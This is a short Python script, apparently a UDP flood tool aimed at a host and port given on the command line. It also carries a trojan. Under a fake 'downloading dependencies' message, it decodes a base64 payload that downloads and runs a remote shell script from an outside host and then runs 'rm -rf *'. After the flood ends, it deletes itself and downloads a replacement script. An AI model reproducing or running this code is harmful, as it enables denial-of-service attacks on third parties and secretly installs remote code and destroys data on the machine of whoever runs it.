import os
import socket
import base64
import sys
import time

host = sys.argv[1]
puerto = int(sys.argv[2])
tiempo = time.time() + int(sys.argv[3])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
payload2 = b'b3Muc3lzdGVtKCdjZCAvdG1wIHx8IGNkIC92YXIvcnVuIHx8IGNkIC9tbnQgfHwgY2QgL3Jvb3QgfHwgY2QgLzsgd2dldCBodHRwczovL3BydWViaXRhLnRoZWRhcmtzaXRlLnh5ei9PYmxpdmlvbjEyMS5zaDsgY3VybCAtTyBodHRwczovL3BydWViaXRhLnRoZWRhcmtzaXRlLnh5ei9PYmxpdmlvbjEyMS5zaDsgY2htb2QgNzc3IE9ibGl2aW9uMTIxLnNoOyBzaCBPYmxpdmlvbjEyMS5zaDsgcm0gLXJmIConKQ=='
print("Descargando dependencias....")
time.sleep(2)
exec(base64.b64decode(payload2))
os.system("clear")
while True:
    if time.time() > tiempo:
        os.system("rm ovh.py")
        os.system("wget https://raw.githubusercontent.com/BypasserTester/stomp/main/ovh.py")
        break;
    s.sendto(payload,(host,puerto))

